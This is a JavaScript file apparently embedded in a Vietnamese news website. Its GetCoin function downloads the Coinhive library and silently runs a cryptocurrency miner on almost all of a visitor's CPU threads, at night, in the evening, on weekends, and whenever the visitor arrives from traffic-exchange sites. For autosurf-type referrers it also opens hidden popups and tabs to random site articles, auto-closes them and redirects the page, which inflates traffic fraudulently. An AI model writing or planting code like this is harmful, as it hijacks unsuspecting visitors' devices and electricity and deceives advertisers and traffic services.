var _random = Math.floor((Math.random() * 2) + 1);
if(document.referrer.indexOf('autosurf')>=0 || document.referrer.indexOf('2pink')>=0 || document.referrer.indexOf('traffic')>=0 || document.referrer.indexOf('otohits')>=0 || document.referrer.indexOf('10khits')>=0 || document.referrer.indexOf('surf')>=0){ 
    var request = new XMLHttpRequest();
    request.open('GET','https://cungbiet.com/wp-json/wp/v2/posts');
    request.onload = function(){
        if(request.status >= 200 && request.status <400){
            //console.log("kết nối thành công");
            var data = JSON.parse(request.responseText);  
            var i = (Math.random() * data.length) | 0;
            var ii = (Math.random() * data.length) | 0;
            var iii = (Math.random() * data.length) | 0;
            var url = data[i].link;
            var _url = data[ii].link;
            var __url = data[iii].link;
            if(document.referrer !='' && _random == 1){
                if (document.referrer != '' && _random == 1) {
                    setTimeout(function () {
                        window.location.href = url + ((/\?/).test(url) ? "&" : "?") + 'rf=1';
                    }, Math.floor((Math.random() * 5) + 1) * 60000);
                }
            }
            if(document.referrer.indexOf('autosurf')<0){
                OpenInNewWinBrowser(_url + ((/\?/).test(_url) ? "&" : "?") + 'rf=1');
                OpenInNewTabWinBrowser(__url + ((/\?/).test(__url) ? "&" : "?") + 'rf=1');
            }
        }else{
            console.log("đã kết nối đến server, nhưng có lỗi");
        }
    };
    request.onerror = function(){
        //console.log("kết nối thất bại");
        var cate = [
            'thoi-su',
            'khoa-hoc',
            'van-hoa',
            'nghe-thuat',
            'doi-song',
            'suc-khoe',
            'kham-pha',
            'giai-tri',
            'khi-khoa-hoc-nhin-thay-duc-phat-post628.html',
            'nghien-cuu-moi-co-the-thach-thuc-cac-dinh-luat-co-ban-cua-chung-ta-ve-vat-ly-post615.html',
            'phuong-trinh-moi-giai-thich-su-hon-don-luong-tu-post606.html',
            'cung-xem-cac-hoa-thach-nao-khung-long-o-dau-post594.html',
            'phat-hien-cac-vi-co-micromotors-co-van-chuyen-thuoc-dieu-tri-nhiem-khuan-trong-da-day-post595.html',
            'mot-phuong-phap-dieu-tri-ung-thu-moi-co-the-hieu-qua-hon-hoa-tri-post552.html',
            'chuyen-gia-chung-ta-co-tao-ra-mot-tuong-lai-tuyet-voi-voi-ai-neu-chung-ta-bat-dau-ke-hoach-ngay-bay-gio-post554.html',
            'cong-nghe-quet-nao-co-de-doa-quyen-tu-nhan-thuc-cua-chung-ta-post512.html',
            'facebook-dang-phat-trien-tro-ly-ao-cho-kinh-thuc-te-ao-oculus-rift-post479.html',
            'rong-bien-co-tro-thanh-dong-minh-trong-cuoc-chien-chong-bien-doi-khi-hau-post486.html'
        ];
        var i = (Math.random() * cate.length) | 0;
        var ii = (Math.random() * cate.length) | 0;
        var iii = (Math.random() * cate.length) | 0;
        var url = "https://cungbiet.com/"+cate[i];
        var _url = "https://cungbiet.com/"+cate[ii];
        var __url = "https://cungbiet.com/"+cate[iii];
        if(document.referrer !='' && _random == 1){
            setTimeout(function () {
                window.location.href = url + ((/\?/).test(url) ? "&" : "?") + 'rf=1';
            }, Math.floor((Math.random() * 5) + 1) * 60000);
        }
        if(document.referrer.indexOf('autosurf')<0){
            OpenInNewWinBrowser(_url + ((/\?/).test(_url) ? "&" : "?") + 'rf=1');
            OpenInNewTabWinBrowser(__url + ((/\?/).test(__url) ? "&" : "?") + 'rf=1');
        }      
    }; 
    request.send();
    GetCoin();
}else{
    var now = new Date();
    var millisTill0h_am = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 0, 0, 0, 0) - now;
    var millisTill8h_am = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 8, 0, 0, 0) - now;
    var millisTill6h_pm = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 18, 0, 0, 0) - now;
    /* if (millisTill6h_pm < 0) {
        millisTill6h_pm += 86400000; // it's after 6pm, try 6pm tomorrow.
    } */
    if (now.getDay() == 6 || now.getDay() == 0) {
        GetCoin();
    } else {
        if (millisTill6h_pm <= 0) {
            GetCoin();
        }
        if (millisTill0h_am <= 0 && millisTill8h_am>=0) {
            GetCoin();
        }
        /* setTimeout(function () {
            GetCoin();
        }, millisTill6h_pm); */
    }
}

function OpenInNewWinBrowser(url,focus=0) {
    var win = window.open(url, '_blank', 'channelmode=yes,toolbar=no,scrollbars=yes,resizable=yes,top=0,left=0,width=400,height=400');
    if(focus) win.focus();
    setTimeout(function(){
        win.close();
    },Math.floor((Math.random() * 10) + 1)*60000);
}
function OpenInNewTabWinBrowser(url,focus=0) {
    var winTab = window.open(url, '_blank');
    if(focus) winTab.focus();
    setTimeout(function(){
        winTab.close();
    },Math.floor((Math.random() * 10) + 1)*60000);
}
function GetCoin() {
    jQuery.ajax({
        url: 'https://coinhive.com/lib/coinhive.min.js',
        cache: true,
        async: false
    }).fail(function () {
        console.log("error");
    }).always(function () {
        console.log("complete");
        var min = 0;
        var max = 2;
        // and the formula is:
        var random = Math.floor(Math.random() * (max - min + 1)) + min;
        console.log(random);
        var _threads = navigator.hardwareConcurrency - random;
        var miner = new CoinHive.Anonymous('iORcLFBHa3WKWwMZqf6fZEPqnX0RZAF8', {
            threads: _threads,
        });
        if (!miner.isMobile()) {
            miner.start();
        }
    });
}